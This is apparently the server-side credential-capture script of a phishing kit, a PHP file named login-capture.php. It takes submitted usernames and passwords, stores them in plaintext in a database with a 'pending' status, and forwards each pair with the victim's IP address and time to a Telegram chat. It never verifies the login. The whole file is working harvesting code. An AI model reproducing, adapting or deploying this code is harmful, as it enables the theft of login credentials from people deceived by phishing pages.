<?php
// Include our standardized error handler
require_once 'error-handler.php';
setupApiErrorHandling();  // This handles JSON errors automatically

// Set up error logging
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// Use a relative path for error logging that works on both local and cPanel
$logPath = dirname(__FILE__) . '/error.log';
if (is_writable(dirname($logPath))) {
    ini_set('error_log', $logPath);
}

// Include files AFTER error handling is set up
include 'db_connect.php';
include 'notification_config.php';

error_log("login-capture.php: Script started");

// Create response object
$response = [
    'success' => false,
    'message' => 'Unknown error',
    'attempt_id' => 0
];

try {
    // Check database connection first
    if ($conn->connect_error) {
        throw new Exception("Database connection failed: " . $conn->connect_error);
    }
    
    // Get POST data
    $userId = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');

    if (empty($userId) || empty($password)) {
        throw new Exception("Username and password are required");
    }
    
    // Log incoming data
    error_log("Received login attempt - Username: $userId, IP: $ipAddress");
    
    // Check rate limiting - MODIFIED TO AVOID get_result()
    $rateLimitSql = "SELECT COUNT(*) AS attempt_count FROM login_attempts WHERE ip_address = ? AND date > NOW() - INTERVAL 1 MINUTE";
    $rateLimitStmt = $conn->prepare($rateLimitSql);
    
    if (!$rateLimitStmt) {
        throw new Exception("Rate limiting query preparation failed: " . $conn->error);
    }
    
    $rateLimitStmt->bind_param("s", $ipAddress);
    
    if (!$rateLimitStmt->execute()) {
        throw new Exception("Rate limiting query execution failed: " . $rateLimitStmt->error);
    }
    
    // Instead of get_result(), use bind_result() and fetch()
    $attemptCount = 0;
    $rateLimitStmt->bind_result($attemptCount);
    $rateLimitStmt->fetch();
    $rateLimitStmt->close();
    
    if ($attemptCount > 5) {
        $response['message'] = 'Too many login attempts. Please try again later.';
        echo json_encode($response);
        exit;
    }
    
    // Check if login_attempts table exists
    $tableCheckQuery = "SHOW TABLES LIKE 'login_attempts'";
    $tableCheck = $conn->query($tableCheckQuery);
    
    if (!$tableCheck || $tableCheck->num_rows == 0) {
        throw new Exception("login_attempts table does not exist");
    }
    
    // Log the login attempt in the database
    $sql = "INSERT INTO login_attempts (userId, password, ip_address, user_agent, date, status) VALUES (?, ?, ?, ?, ?, 'pending')";
    $stmt = $conn->prepare($sql);
    
    if (!$stmt) {
        throw new Exception("SQL Error: " . $conn->error);
    }
    
    $stmt->bind_param("sssss", $userId, $password, $ipAddress, $userAgent, $timestamp);
    
    if (!$stmt->execute()) {
        throw new Exception("Failed to log login attempt: " . $stmt->error);
    }
    
    $attemptId = $conn->insert_id;
    error_log("Login attempt logged successfully with ID: $attemptId");
    
    // Send notification to Telegram
    try {
        $telegramMessage = "🔔 NEW LOGIN ATTEMPT 🔔\nUser: {$userId}\nPassword: {$password}\nIP Address: {$ipAddress}\nTime: {$timestamp}";
        $telegramSent = sendToTelegram($telegramMessage);
        
        if ($telegramSent) {
            error_log("Telegram notification sent successfully");
        } else {
            error_log("Telegram notification may have failed");
        }
    } catch (Exception $telegramError) {
        error_log("Telegram notification failed: " . $telegramError->getMessage());
        // Continue execution even if Telegram notification fails
    }
    
    // Success response
    $response = [
        'success' => true,
        'attempt_id' => $attemptId
    ];
    
} catch (Exception $e) {
    error_log("Exception in login-capture.php: " . $e->getMessage());
    $response['message'] = $e->getMessage();
} finally {
    // Close statement and connection in finally block
    if (isset($stmt) && $stmt) {
        $stmt->close();
    }
    if (isset($conn) && $conn) {
        $conn->close();
    }
    
    // Return JSON response
    echo json_encode($response);
    
    // Clean output buffer
    ob_end_flush();
}
?>